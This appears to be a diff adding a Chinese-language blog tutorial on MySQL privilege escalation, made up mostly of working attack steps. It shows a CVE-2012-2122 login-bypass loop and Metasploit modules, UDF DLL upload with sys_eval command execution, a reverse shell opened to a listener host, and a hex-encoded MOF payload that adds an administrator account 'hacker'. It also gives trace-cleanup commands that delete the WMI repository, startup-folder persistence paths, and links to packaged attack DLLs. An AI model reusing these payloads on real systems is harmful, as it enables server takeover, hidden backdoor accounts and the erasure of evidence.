+<p>有条件的朋友可以搭建这个漏洞对应的靶场环境</p>
+<p><strong>Linux</strong> : MySQL 5.0.45-Debian_1ubuntu3.1-log</p>
+<p><strong>Windows</strong> : MySQL 5.0.45-community-nt</p>
+<h3 id="CVE-2012-2122"><a href="#CVE-2012-2122" class="headerlink" title="CVE-2012-2122"></a>CVE-2012-2122</h3><p>知道用户名多次输入错误的密码会有几率可以直接成功登陆进数据库，可以循环 1000 次登陆数据库：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i in `seq <span class="number">1</span> <span class="number">1000</span>`; do mysql -uroot -pwrong -h <span class="number">127.0</span>.<span class="number">0.1</span> -P3306 ; done</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347404010-4c677aad-f762-45ff-b4fe-29d4916acf98.png"></p>
+<p>MSF 里面也有了对应的脚本模块可以直接使用，成功后会直接 DUMP 出 MySQL 的 Hash 值：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br><span class="line">msf6 &gt; set rhosts <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">msf6 &gt; <span class="keyword">run</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347410597-67ed16b7-67bc-464a-8417-7df559d69cb5.png"></p>
+<p>这个 MySQL 的 Hash 解密出的结果为 123456</p>
+<h2 id="UDF-提权"><a href="#UDF-提权" class="headerlink" title="UDF 提权"></a>UDF 提权</h2><p>自定义函数，是数据库功能的一种扩展。用户通􏰁自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在 SQL 语句中调用，就像调用本机函数 version () 等方便。</p>
+<h2 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h2><h3 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h3><p>如果是 MySQL &gt;&#x3D; 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。</p>
+<p>那么动态链接库文件去哪里找呢？实际上我们常用的工具 sqlmap 和 Metasploit 里面都自带了对应系统的动态链接库文件。</p>
+<ul>
+<li><strong>sqlmap 的 UDF 动态链接库文件位置</strong></li>
+</ul>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap根目录/<span class="keyword">data</span>/udf/mysql</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347391416-4eb454f1-7876-44b1-b884-2dce13dfc719.png"></p>
+<p>不过 sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用 sqlmap 自带的解码工具 cloak.py 来解码使用，cloak.py 的位置为：<code>/extra/cloak/cloak.py</code> ，解码方法如下：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">➜ pwd</span><br><span class="line">/Users/guang/Documents/X1ct34m/sqlmap/<span class="number">1.4</span>.<span class="number">6</span>/extra/cloak</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">➜ python3 cloak.py -d -i ../../<span class="keyword">data</span>/udf/mysql/linux/<span class="number">32</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">➜ python3 cloak.py -d -i ../../<span class="keyword">data</span>/udf/mysql/linux/<span class="number">64</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">➜ python3 cloak.py -d -i ../../<span class="keyword">data</span>/udf/mysql/windows/<span class="number">32</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">➜ python3 cloak.py -d -i ../../<span class="keyword">data</span>/udf/mysql/windows/<span class="number">64</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">➜ ls</span><br><span class="line">README.txt              cloak.py                lib_mysqludf_sys_32.so  lib_mysqludf_sys_64.so</span><br><span class="line">__init__.py             lib_mysqludf_sys_32.dll lib_mysqludf_sys_64.dll</span><br></pre></td></tr></table></figure>
+
+<p>国光打包了 sqlmap 解码后的动态链接库：<a target="_blank" rel="noopener" href="https://sqlsec.lanzoux.com/i4b7jhyhwid">蓝奏云 - sqlmap udf.zip</a> 需要的朋友可以自提</p>
+<ul>
+<li><strong>Metasploit 的 UDF 动态链接库文件位置</strong></li>
+</ul>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MSF 根目录/embedded/framework/<span class="keyword">data</span>/exploits/mysql</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347393191-6e85acd0-158f-4303-ad30-140a055f049d.png"></p>
+<p>Metasploit 自带的动态链接库文件无需解码，开箱即可食用。</p>
+<p>国光使用 010-Editor 对比了 metsaploit 自带的与 sqlmap 解码后的动态链接库文件，发现他们的内容一模一样。</p>
+<p>下面来看下动态链接库里面有包含了哪些函数：</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347408360-be74b570-f366-4ee2-a893-3332111d1c62.png"></p>
+<h3 id="寻找插件目录"><a href="#寻找插件目录" class="headerlink" title="寻找插件目录"></a>寻找插件目录</h3><p>接下来的任务是把 UDF 的动态链接库文件放到 MySQL 的插件目录下，这个目录改如何去寻找呢？可以使用如下的 SQL 语句来查询：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like <span class="comment">&#x27;%plugin%&#x27;;</span></span><br><span class="line">+</span><br><span class="line">| Variable_name | Value                        |</span><br><span class="line">+</span><br><span class="line">| plugin_dir    | /<span class="keyword">usr</span>/local/mysql/lib/plugin/ |</span><br><span class="line">+</span><br></pre></td></tr></table></figure>
+
+<p>如果不存在的话可以在 webshell 中找到 MySQL 的安装目录然后手工创建 <code>\lib\plugin</code> 文件夹：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; select <span class="number">233</span> into dumpfile <span class="comment">&#x27;C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过 NTFS ADS 流创建文件夹成功率不高，目前 MySQL 官方貌似已经阉割了这个功能。那么如果找到 MySQL 的安装目录呢？通用也有对应的 SQL 语句可以查询出来：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @@basedir;</span><br><span class="line">+</span><br><span class="line">| @@basedir        |</span><br><span class="line">+</span><br><span class="line">| /<span class="keyword">usr</span>/local/mysql |</span><br><span class="line">+</span><br></pre></td></tr></table></figure>
+
+<h3 id="写入动态链接库"><a href="#写入动态链接库" class="headerlink" title="写入动态链接库"></a>写入动态链接库</h3><p>写入动态链接库可以分为下面几种情形：</p>
+<p>SQL 注入且是高权限，plugin 目录可写且需要 secure_file_priv 无限制，MySQL 插件目录可以被 MySQL 用户写入，这个时候就可以直接使用 sqlmap 来上传动态链接库，又因为 GET 有<strong>字节长度限制</strong>，所以往往 POST 注入才可以执行这种攻击</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://localhost:30008/&quot;</span> --<span class="keyword">data</span>=<span class="string">&quot;id=1&quot;</span> --file-<span class="keyword">write</span>=<span class="string">&quot;/Users/sec/Desktop/lib_mysqludf_sys_64.so&quot;</span> --file-dest=<span class="string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347397473-c95dcfa8-06a3-4a59-ae7d-9a78f2d6cba5.png"></p>
+<ol>
+<li>如果没有注入的话，我们可以操作原生 SQL 语句，这种情况下当 secure_file_priv 无限制的时候，我们也是可以手工写文件到 plugin 目录下的：</li>
+</ol>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT <span class="number">0</span>x7f454c4602... INTO DUMPFILE <span class="comment">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SELECT unhex(<span class="comment">&#x27;7f454c4602...&#x27;) INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的十六进制怎么获取呢？可以利用 MySQL 自带的 hex 函数来编码：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT hex(load_file(<span class="comment">&#x27;/lib_mysqludf_sys_64.so&#x27;));</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SELECT hex(load_file(<span class="number">0</span>x2f6c69625f6d7973716c7564665f7379735f36342e736f));</span><br></pre></td></tr></table></figure>
+
+<p>一般为了更方便观察，可以将编码后的结果导入到新的文件中方便观察：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT hex(load_file(<span class="comment">&#x27;/lib_mysqludf_sys_64.so&#x27;)) into dumpfile &#x27;/tmp/udf.txt&#x27;; </span></span><br><span class="line"></span><br><span class="line">SELECT hex(load_file(<span class="number">0</span>x2f6c69625f6d7973716c7564665f7379735f36342e736f)) into dumpfile <span class="comment">&#x27;/tmp/udf.txt&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<p>为了方便大家直接复制，国光这里单独写了个页面，有意者自取：<a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">MySQL UDF 提权十六进制查询</a></p>
+<blockquote>
+<p>网友们可能看到这个报错，因为 lib_mysqludf_sys_64.dll 失败，最后使用 lib_mysqludf_sys_32.dll 才成功，所以这里的 dll 应该和系统位数无关，可能和 MySQL 的安装版本有关系，而 PHPStudy 自带的 MySQL 版本是 32 位的</p>
+</blockquote>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ERROR</span> <span class="number">1126</span> (HY000): Can<span class="comment">&#x27;t open shared library &#x27;udf.dll&#x27; (errno: 193 )</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="创建自定义函数并调用命令"><a href="#创建自定义函数并调用命令" class="headerlink" title="创建自定义函数并调用命令"></a>创建自定义函数并调用命令</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; CREATE FUNCTION sys_eval RETURNS STRING SONAME <span class="comment">&#x27;udf.dll&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<p>导入成功后查看一下 mysql 函数里面是否新增了 sys_eval：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">+</span><br><span class="line">| <span class="keyword">name</span>     | ret | dl      | type     |</span><br><span class="line">+</span><br><span class="line">| sys_eval |   <span class="number">0</span> | udf.dll | function |</span><br><span class="line">+</span><br></pre></td></tr></table></figure>
+
+<p>这里的 sys_eval 支持自定义，接着就可以通过创建的这个函数来执行系统命令了：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; select sys_eval(<span class="comment">&#x27;whoami&#x27;);</span></span><br></pre></td></tr></table></figure>
+
+<p>如果在 Windows 系统下的话应该就是最高权限了，执行一些 net user 增加用户的命令应该都是可以成功的</p>
+<h3 id="删除自定义函数"><a href="#删除自定义函数" class="headerlink" title="删除自定义函数"></a>删除自定义函数</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; drop function sys_eval;</span><br></pre></td></tr></table></figure>
+
+<h2 id="UDF-shell"><a href="#UDF-shell" class="headerlink" title="UDF shell"></a>UDF shell</h2><p>假设目标 MySQL 在内网情况下，无法直连 MySQL 或者 MySQL 不允许外连，这个时候一些网页脚本就比较方便好用了。</p>
+<h3 id="UDF-PHP"><a href="#UDF-PHP" class="headerlink" title="UDF.PHP"></a>UDF.PHP</h3><p><a target="_blank" rel="noopener" href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php">t00ls UDF.PHP</a> 简单方便，一键 DUMP UDF 和函数，操作门槛降低了很多：</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347402936-a593fafb-ca02-4913-b6cb-bf1dbdfb6e0a.png"></p>
+<h3 id="Navicat-MySQL"><a href="#Navicat-MySQL" class="headerlink" title="Navicat MySQL"></a>Navicat MySQL</h3><p>目标 MySQL 不允许外连，但是可以上传 PHP 脚本:</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347410559-8b250b8f-fa00-479c-ab51-b8d55da808fe.png"></p>
+<p>这个时候可以使用 Navicat 自带的 tunnel 隧道脚本上传到目标网站上：</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347410252-6db8b563-5e69-4ab1-a4ee-160ccad0e4d6.png"></p>
+<p>国光这里顺便打包了一份出来：<a target="_blank" rel="noopener" href="https://sqlsec.lanzoux.com/ibpoGijd6bc">蓝奏云：Navicat tunnel.zip</a> 实际上 Navicat 很久很久以前就自带这些脚本了，这个脚本有点类似于 reGeorg，只是官方的脚本用起来更舒服方便一点，脚本的界面如下：</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347410780-ced72277-9f68-43d8-a2d4-8ea3f71998a8.png"></p>
+<p>接着连接的时候设置 HTTP 通道：</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347410767-36c74828-1b9b-424b-99d1-67686e9eb214.png"></p>
+<p>这个时候主机地址填写 localhost 即可：</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347414086-4d831f2b-21bf-4cff-b8b8-d57a16f454e4.png"></p>
+<p>连接成功后自然就可以愉快地进行手工 UDF 提权啦：</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347414197-ddf6dd7f-8782-4fcf-ad4a-f4d40f79071d.png"></p>
+<h2 id="反弹端口提权"><a href="#反弹端口提权" class="headerlink" title="反弹端口提权"></a>反弹端口提权</h2><p>实际上这是 UDF 提权的另一种用法，只是这里的动态链接库被定制过的，功能更多更实用一些：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cmdshell        </span><br><span class="line">downloader      </span><br><span class="line">open3389        </span><br><span class="line">backshell       </span><br><span class="line">ProcessView     </span><br><span class="line">KillProcess     </span><br><span class="line">regread         </span><br><span class="line">regwrite        </span><br><span class="line">shut            </span><br><span class="line">about</span><br></pre></td></tr></table></figure>
+
+<p>这个动态链接库有点历史了，不过还是被国光我找到了<a target="_blank" rel="noopener" href="https://sqlsec.lanzoux.com/iEQA0ijfu6d">蓝奏云：langouster_udf.zip</a>：</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347418332-b4fbd36a-f3b1-4e3c-a044-a8a284fcae5f.png"></p>
+<p>下面尝试来使用这个 dll 来反弹 shell 试试看吧，首先在 10.20.24.244 上开启 NC 监听：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ncat -lvp <span class="number">2333</span></span><br><span class="line">Ncat: Version <span class="number">7.80</span> ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening <span class="keyword">on</span> :::<span class="number">2333</span></span><br><span class="line">Ncat: Listening <span class="keyword">on</span> <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">2333</span></span><br></pre></td></tr></table></figure>
+
+<p>然后目标机器上导入 dll 动态链接库（这里偷懒就忽略了），然后创建自定义函数：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; CREATE FUNCTION backshell RETURNS STRING SONAME <span class="comment">&#x27;udf.dll&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<p>直接反弹 shell ：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; select backshell(<span class="string">&quot;10.20.24.244&quot;</span>, <span class="number">2333</span>);</span><br></pre></td></tr></table></figure>
+
+<p>成功上线：</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347414145-60ee3085-9c07-4fd7-a760-96ae1c38db4d.png"></p>
+<h2 id="MOF-提权"><a href="#MOF-提权" class="headerlink" title="MOF 提权"></a>MOF 提权</h2><p>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。提权的原理是 C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F; 目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p>
+<h2 id="手工复现-1"><a href="#手工复现-1" class="headerlink" title="手工复现"></a>手工复现</h2><h3 id="上传-mof-文件执行命令"><a href="#上传-mof-文件执行命令" class="headerlink" title="上传 mof 文件执行命令"></a>上传 mof 文件执行命令</h3><p>mof 脚本的内容如下：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(<span class="string">&quot;\\\\.\\root\\subscription&quot;</span>) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = <span class="string">&quot;Root\\Cimv2&quot;</span>; </span><br><span class="line">    <span class="keyword">Name</span>  = <span class="string">&quot;filtP2&quot;</span>; </span><br><span class="line">    Query = <span class="string">&quot;Select * From __InstanceModificationEvent &quot;</span> </span><br><span class="line">            <span class="string">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span> </span><br><span class="line">            <span class="string">&quot;And TargetInstance.Second = 5&quot;</span>; </span><br><span class="line">    QueryLanguage = <span class="string">&quot;WQL&quot;</span>; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">Name</span> = <span class="string">&quot;consPCSV2&quot;</span>; </span><br><span class="line">    ScriptingEngine = <span class="string">&quot;JScript&quot;</span>; </span><br><span class="line">    ScriptText = </span><br><span class="line"><span class="string">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hacker P@ssw0rd /add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators hacker /add\&quot;)&quot;</span>; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer; </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>核心 payload 为：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var WSH = <span class="keyword">new</span> ActiveXObject(\<span class="string">&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hacker P@ssw0rd /add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators hacker /add\&quot;)</span></span><br></pre></td></tr></table></figure>
+
+<p>MySQL 写文件的特性将这个 MOF 文件导入到 C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F; 目录下，依然采用上述编码的方式：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; select <span class="number">0</span>x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A into dumpfile <span class="string">&quot;C:/windows/system32/wbem/mof/test.mof&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>执行成功的的时候，test.mof 会出现在：c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;goog&#x2F; 目录下 否则出现在 c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;bad 目录下：</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347414140-f59ae57f-2f1d-48bd-b222-c00186080112.png"></p>
+<h3 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h3><p>因为每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 winmgmt 服务再删除相关 mof 文件，这个时候再删除用户才会有效果：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">net <span class="keyword">stop</span> winmgmt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">rmdir</span> /s /q C:\Windows\system32\wbem\Repository\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">del C:\Windows\system32\wbem\mof\good\test.mof /F /S</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">net user hacker /<span class="keyword">delete</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure>
+
+<h2 id="MSF-MOF-提权"><a href="#MSF-MOF-提权" class="headerlink" title="MSF MOF 提权"></a>MSF MOF 提权</h2><p>MSF 里面也自带了 MOF 提权模块，使用起来也比较方便而且也做到了自动清理痕迹的效果，实际操作起来效率也还不错：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/mysql/mysql_mof</span><br><span class="line"></span><br><span class="line">msf6 &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; set rhosts <span class="number">10.211</span>.<span class="number">55.21</span></span><br><span class="line">msf6 &gt; set username root</span><br><span class="line">msf6 &gt; set password root</span><br><span class="line">msf6 &gt; <span class="keyword">run</span></span><br></pre></td></tr></table></figure>
+
+<p>实际运行效果如下：</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347422335-1e87d88e-9756-4330-810b-8fe26fe5c96e.png"></p>
+<h2 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h2><p>这种提权也常见于 Windows 环境下，当 Windows 的启动项可以被 MySQL 写入的时候可以使用 MySQL 将自定义脚本导入到启动项中，这个脚本会在用户登录、开机、关机的时候自动运行。</p>
+<h2 id="手工复现-2"><a href="#手工复现-2" class="headerlink" title="手工复现"></a>手工复现</h2><h3 id="启动项路径"><a href="#启动项路径" class="headerlink" title="启动项路径"></a>启动项路径</h3><p><strong>Windows Server 2003</strong> 的启动项路径：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents <span class="keyword">and</span> Settings\Administrator\「开始」菜单\程序\启动</span><br><span class="line">C:\Documents <span class="keyword">and</span> Settings\All Users\「开始」菜单\程序\启动</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Documents <span class="keyword">and</span> Settings\Administrator\Start Menu\Programs\Startup</span><br><span class="line">C:\Documents <span class="keyword">and</span> Settings\All Users\Start Menu\Programs\Startup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Startup</span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Shutdown</span><br></pre></td></tr></table></figure>
+
+<p><strong>Windows Server 2008</strong> 的启动项路径：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>
+
+<p>既然知道路径的话就往启动项路径里面写入脚本吧，脚本支持 vbs 和 exe 类型，可以利用 vbs 执行一些 CMD 命令，也可以使用 exe 上线 MSF 或者 CS 这方面还是比较灵活的。下面是一个执行基础命令的 VB 脚本：</p>
